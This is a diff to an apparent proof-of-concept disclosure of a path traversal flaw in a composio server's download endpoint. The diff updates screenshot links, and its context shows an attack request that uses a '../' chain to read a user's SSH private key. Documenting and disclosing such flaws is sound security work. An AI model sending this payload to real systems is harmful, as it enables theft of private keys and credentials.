@@ -10,7 +10,7 @@ The Path(file) operation does not sanitize the user-provided file path. An attac
 
 run the composio server on localhost:8000
 
-<img width="1516" height="174" alt="Server Initialization" src="https://github.com/TOAST-Research/pocs/blob/main/server_start.png?raw=true" />
+<img width="1516" height="174" alt="Server Initialization" src="https://github.com/TOAST-Research/pocs/blob/main/composio/server_start.png?raw=true" />
 
 
 ## attack steps
@@ -18,9 +18,9 @@ run the composio server on localhost:8000
 GET 127.0.0.1:8000/api/download?file=../../../../../../../../../../xxxx/.ssh/id_rsa then the attacker can read the sensitive file on the returned html
 
 
-<img width="1444" height="592" alt="Arbitrary Read Proof" src="https://github.com/TOAST-Research/pocs/blob/main/result.png?raw=true" />
+<img width="1444" height="592" alt="Arbitrary Read Proof" src="https://github.com/TOAST-Research/pocs/blob/main/composio/result.png?raw=true" />
 
-<img width="1702" height="94" alt="112836" src="https://github.com/TOAST-Research/pocs/blob/main/read_success.png?raw=true" />
+<img width="1702" height="94" alt="112836" src="https://github.com/TOAST-Research/pocs/blob/main/composio/read_success.png?raw=true" />
 
 
 # Impact
